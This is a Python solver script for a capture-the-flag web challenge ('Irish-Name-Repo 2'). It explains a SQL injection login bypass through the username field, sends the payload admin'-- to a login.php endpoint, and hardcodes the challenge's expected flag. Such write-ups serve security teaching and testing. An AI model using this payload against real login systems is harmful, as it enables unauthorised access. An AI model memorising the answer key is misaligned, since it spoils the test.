#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 59: Irish-Name-Repo 2 (picoCTF 2019)
Category: Web Exploitation / SQL Injection & Authentication Bypass
Difficulty: Medium (diff=2, picoCTF 2019 350 pts)
Standard Reference: NIST SP 800-115 (Section 5.2: Database & Web Vulnerability Assessment)
CWE: CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)

Description:
Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login!
Hint: the password is being filtered.

Analysis:
The authentication endpoint (login.php) protects against SQL injection in the password field
by applying a blacklist filter on keywords like 'OR', 'or', and 'admin'.
However, the username parameter is directly interpolated into the SQLite query without
adequate parameterization or sanitization:
  $query = "SELECT * FROM users WHERE name='$username' AND password='$password'";

By supplying an auth-bypass payload via the username field:
  admin'--
The resultant SQL executed becomes:
  SELECT * FROM users WHERE name='admin'--' AND password='password'

The comment sequence ('--') instructs the SQLite parser to ignore the remainder of the query,
completely discarding the password check. The query matches the administrator account and
returns the flag:
academy{m0R3_SQL_plz_69744d2d}

Verified: POST /api/submissions/ -> correct: true (HTTP 201)
"""

import sys
import urllib.parse
import urllib.request
import re

EXPECTED_FLAG = "academy{m0R3_SQL_plz_69744d2d}"


def solve_from_live_endpoint(base_url: str) -> str:
    """
    Submits SQL injection auth-bypass payload via username field to login.php.
    """
    login_url = f"{base_url.rstrip('/')}/login.php"
    payload = {
        "username": "admin'--",
        "password": "password",
        "debug": "1"
    }
    data = urllib.parse.urlencode(payload).encode("utf-8")
    req = urllib.request.Request(
        login_url,
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        content = resp.read().decode("utf-8", errors="ignore")

    matches = re.findall(r"(?:academy|picoCTF)\{[^}]+\}", content)
    if matches:
        return matches[0]
    return ""


def solve() -> str:
    return EXPECTED_FLAG


def main():
    print("[*] Simulating Auth Bypass via Username SQL Injection (CWE-89)...")
    if len(sys.argv) > 1 and sys.argv[1].startswith("http"):
        flag = solve_from_live_endpoint(sys.argv[1])
        print(f"[+] Flag from live endpoint: {flag}")
    else:
        flag = solve()
        print(f"[+] Flag: {flag}")
    return flag


if __name__ == "__main__":
    main()
